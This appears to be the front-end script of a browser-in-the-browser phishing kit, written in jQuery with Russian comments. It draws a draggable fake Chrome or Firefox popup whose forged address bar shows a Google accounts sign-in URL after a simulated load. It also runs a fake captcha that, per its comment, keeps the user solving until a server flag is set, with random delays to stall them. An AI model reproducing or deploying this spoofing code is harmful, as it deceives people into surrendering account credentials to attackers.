
//////////////////скрипты окна
$( ".top-bar__wrapper" ).mousedown(function() {///////////скрипт перетаскивания
    if($(".popup").hasClass("popup_active")) {        
    }else{
         $('.popup').draggable({});
    } 
});

$( ".top-bar__wrapper" ).mouseleave(function() {/////////////скрипт отмены перетаскивания когда убрали мышку от шапки
	$('.popup').draggable( "destroy" );
});

$('.popup__wrapper').resizable({//////////////////скрипт растягивания
    minWidth: 322, //минимальные размеры
    minHeight:160
});

$( ".top-bar__wrapper-mozilla" ).mousedown(function() {///////////скрипт перетаскивания
    $('.popup').draggable({});
});

$( ".top-bar__wrapper-mozilla" ).mouseleave(function() {///////скрипт отмены перетаскивания когда убрали мышку от шапки
    $('.popup').draggable( "destroy" );
});


$('.popup__mozilla-wrapper').resizable({//////////////////скрипт растягивания
    minWidth: 322,
    minHeight:160
});

setTimeout(function(){
    $('.bottom-bar__google-link-wrapper').fadeOut(); //эмуляция загрузки страницы(длиться 3 секунды)
    $('.lds-ring').hide();
    $('.top-bar__logo').show();
    $('.top-bar__name').text("Вход — Google Аккаунты - Google Chrome");
    $('.bottom-bar__path').prepend("<span class='bottom-bar__black-style'>accounts.google.com</span>/o/oauth2/v2/auth/oauthchooseaccount?client_id=532352704633-6pkces9iboppp465idnovkcqtlsa8j7t.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fwww.figma.com%2Ffinish_google_sso&response_type=code&scope=profile%20email&access_type=online&prompt=select_account&state=ic0ZWg4%2FCe%2B1%2F7NaEdwig6dZqSpGmkbqJcXTOSDLC99V&flowName=GeneralOAuthFlow")
}, 3000);

setTimeout(function(){
    $('.bottom-bar__mozilla-google-link-wrapper').fadeOut();
    $('.top-bar__mozilla-name').text("Вход - Google Аккаунты — Mozilla Firefox");
    $('.bottom-bar__mozille-search').hide();
    $('.bottom-bar__mozille-lock').show();
    $('.bottom-bar__mozille-path').prepend("accounts.<span class='bottom-bar__black-style'>google.com</span>/o/oauth2/v2/auth/oauthchooseaccount?client_id=532352704633-6pkces9iboppp465idnovkcqtlsa8j7t.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fwww.figma.com%2Ffinish_google_sso&response_type=code&scope=profile%20email&access_type=online&prompt=select_account&state=3eTQuEXL0MDwS0PV62WlpQ5phjhiDbeHBYTPE7GfNnNa&flowName=GeneralOAuthFlow");
    
}, 3000);

$('.top-bar__button_close').click(function () {// закрытие окна
    $(".popup").hide();
});

$('.top-bar__button_expand').click(function () { // сворачивание окна
    $(".popup").removeClass("popup_roll");
    $(".popup").toggleClass("popup_active");
    
    if($(".popup").hasClass("popup_active")) {
        $('.ui-resizable-s').hide();
        $('.ui-resizable-e').hide();
        $('.popup').draggable( "destroy" ); 
    }else{
        $('.ui-resizable-s').show();
        $('.ui-resizable-e').show();
    }  
    
});


$('.top-bar__button_roll').click(function () { // сворачивание окна
    $(".popup").removeClass("popup_active");
    $(".popup").toggleClass("popup_roll");

    if($(".popup").hasClass("popup_roll")) {
        $('.ui-resizable-s').hide();
        $('.ui-resizable-e').hide();
        $('.popup').draggable( "destroy" ); 
    }else{
        $('.ui-resizable-s').show();
        $('.ui-resizable-e').show();
    }
});


$(document).mouseup(function (e){ 
    var div = $(".capcha__popup"); 
    if (!div.is(e.target) 
        && div.has(e.target).length === 0) { 
        div.hide();
        $('.capcha__trigger').removeClass('capcha__trigger_hide');
        $('.capcha__list-case').removeClass('capcha__list_case-disable');
        $('.capcha__trigger').removeClass('capcha__trigger_show');
        $('.capcha__popup-big-title').hide();
        $('.capcha__popup-big-title[data-title="1"]').css("display", "flex");
         $('.capcha__list').removeClass('capcha__list_two_active');
        $('.capcha__list').removeClass('capcha__list_three_active');
        $('.capcha__list').removeClass('capcha__list_one_active');
        counterList = 1;
    }
});

$('.capcha__trigger').click(function () { // эмуляция загрузки (движение кнопки капчи)
    $('.capcha__trigger').addClass("capcha__trigger_hide");
    $('.capcha__spiner').fadeIn(600);

    setTimeout(function(){
        $('.capcha__spiner').fadeOut(600);
        $('.capcha__trigger').addClass("capcha__trigger_show");
        $('.capcha__trigger').show(300);
        $('.capcha__popup').show();       
    }, 3000);
});

var colLists = $('.capcha__list').length;

var atrList = 1;

var dataCase = 1;

var dataTitle = 1;

$('.capcha__list').each(function (index, el){
    $(this).attr("data-counter", atrList);
    atrList++;
});

$('.capcha__list-case').each(function (index, el){
    $(this).attr("data-case", dataCase);
    dataCase++;
});

$('.capcha__popup-big-title').each(function (index, el){
    $(this).attr("data-title", dataTitle);
    dataTitle++;
});

var counter= 0;

$('.capcha__list-item').click(function () { // функция подсчета правильных картинок
    $(this).toggleClass('capcha__list-item_active');
});

var server = false; // подставить сюда значение с базы (true/false) true - пользователь решит капчу, false - будет решать пока не придет ответ true
var allTrue= 0;
var counterList = 1;

var caseCol = 1;

function getRandomIntInclusive(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min; 
}

$('.capcha__button-next').click(function () { // функция переключения капч
    $('.capcha__button-next').attr('disabled','disabled');
    var random = parseInt((getRandomIntInclusive(2, 5) + "000")); // в этой строке указывается диапазон случайно задержки
    counterList++;

    if(server){
        counterList = 1;
        caseCol = 1;
       
        $('.capcha__list-item').removeClass('capcha__list-item_active');
        $('.capcha__list-case').removeClass('capcha__list_case-disable');
        $('.capcha__popup-big-title').hide();
        $('.capcha__popup-big-title[data-title="1"]').css("display", "flex");
        $('.capcha__list').css({transform: '', transition: 'none'});
        $('.capcha__button-next').removeAttr('disabled');
    $('.capcha__popup').fadeOut(300);
        $('.capcha__trigger').hide();
        $('.capcha__ok').addClass("capcha__ok_active");
    }

    if(counterList<=colLists){
        var adpsize;
        if($( window ).width()<=400){
            adpzsize= 318;
        }else{
            adpzsize= 400;
        }
        
        
        var size = ("-"+(adpzsize * (counterList-1))) + "";
        $('.capcha__list-item').removeClass('capcha__list-item_active');
        $('.capcha__list-case').removeClass('capcha__list_case-disable');
        $('.capcha__list-case[data-case="'+caseCol+'"]').addClass('capcha__list_case-disable');
        caseCol++;
       setTimeout(function(){
        $('.capcha__list').css({transform: 'translateX('+size+'px)', transition: 'all 0.5s'});
        $('.capcha__button-next').removeAttr('disabled');
        }, random);       

        $('.capcha__popup-big-title').hide();
        $('.capcha__popup-big-title[data-title="'+counterList+'"]').css("display", "flex");
    }

     if(counterList===colLists+1){
        var random = parseInt((getRandomIntInclusive(2, 5) + "000"));
        $('.capcha__list-case[data-case="'+caseCol+'"]').addClass('capcha__list_case-disable');
        $('.capcha__popup-big-title').hide();
        $('.capcha__popup-big-title[data-title="1"]').css("display", "flex");        
        setTimeout(function(){
            $('.capcha__list').css({transform: '', transition: 'none'});
            counterList = 1;
            caseCol = 1;
            $('.capcha__button-next').removeAttr('disabled');
        }, random);        
    };
    
});



$('.capcha__button-rerol').click(function () { // кнопка сменить капчу
    var adpsize;
        if($( window ).width()<=400){
            adpzsize= 318;
        }else{
            adpzsize= 400;
        }
    var randomsec = parseInt((getRandomIntInclusive(2, 5) + "000"));
    $('.capcha__button-next').attr('disabled','disabled');
    $('.capcha__button-rerol').attr('disabled','disabled');
    var range = $('.capcha__list').length;
    var random = parseInt(getRandomIntInclusive(2, range));
    var size = ("-"+(adpsize * (random-1))) + "";
    $('.capcha__list-item').removeClass('capcha__list-item_active');
    $('.capcha__list-case').addClass('capcha__list_case-disable');
    $('.capcha__list-case[data-case="'+random+'"]').removeClass('capcha__list_case-disable');

    setTimeout(function(){
        $('.capcha__list').css({transform: 'translateX('+size+'px)', transition: 'all 0.5s'});
        $('.capcha__button-next').removeAttr('disabled');
        $('.capcha__button-rerol').removeAttr('disabled');
        }, randomsec);
    $('.capcha__popup-big-title').hide();
        $('.capcha__popup-big-title[data-title="'+random+'"]').css("display", "flex");
    counterList = random;
    caseCol = counterList;
});

$('.capcha__button-info').click(function () { // кнопка инфо по капче
        $(".capcha__info-drop").toggleClass('capcha__info-drop_active');
});





























